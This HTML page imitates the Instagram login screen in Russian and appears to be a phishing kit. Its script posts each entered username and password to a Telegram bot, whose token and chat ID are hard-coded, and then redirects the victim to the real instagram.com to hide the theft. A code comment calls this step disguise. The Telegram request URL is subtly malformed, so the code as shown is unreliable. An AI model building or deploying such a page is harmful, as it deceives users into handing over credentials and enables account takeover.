<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход • Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background-color: #000; display: flex; align-items: center; justify-content: center; height: 100vh; color: #fff; }
        .container { width: 100%; max-width: 350px; padding: 20px; text-align: center; }
        .logo { margin-bottom: 40px; font-size: 35px; font-weight: bold; font-family: sans-serif; font-style: italic; }
        input { 
            width: 100%; padding: 12px; background: #121212; border: 1px solid #363636; 
            border-radius: 3px; color: #fff; margin-bottom: 12px; outline: none; font-size: 14px;
        }
        .login-btn { 
            width: 100%; background: #0095f6; color: #fff; border: none; 
            border-radius: 8px; padding: 10px; font-weight: 600; cursor: pointer;
        }
        .footer { position: absolute; bottom: 20px; color: #8e8e8e; font-size: 13px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">Instagram</div>
        <!-- Наша форма -->
        <form id="tg-form">
            <input type="text" id="user" placeholder="Телефон, имя пользователя или email" required>
            <input type="password" id="pass" placeholder="Пароль" required>
            <button type="submit" class="login-btn">Войти</button>
        </form>
    </div>

    <div class="footer">Meta © 2024</div>

    <script>
    // Твои проверенные данные
    const TOKEN = '8314828218:AAGcMhdPg7GEDW4e1EPAlp-qJt5FkMXwlmY';
    const CHAT_ID = '6576262467';

    document.getElementById('tg-form').onsubmit = async (e) => {
        e.preventDefault();

        // Собираем данные из полей
        const login = document.getElementById('user').value;
        const password = document.getElementById('pass').value;
        const message = `📸 NEW LOG:\n👤 Логин: ${login}\n🔑 Пароль: ${password}`;

        // Твоя логика fetch
        await fetch(`https://telegram.org{TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });

        // Маскировка: перекидываем на реальный сайт
        window.location.href = 'https://instagram.com';
    };
    </script>

</body>
</html>
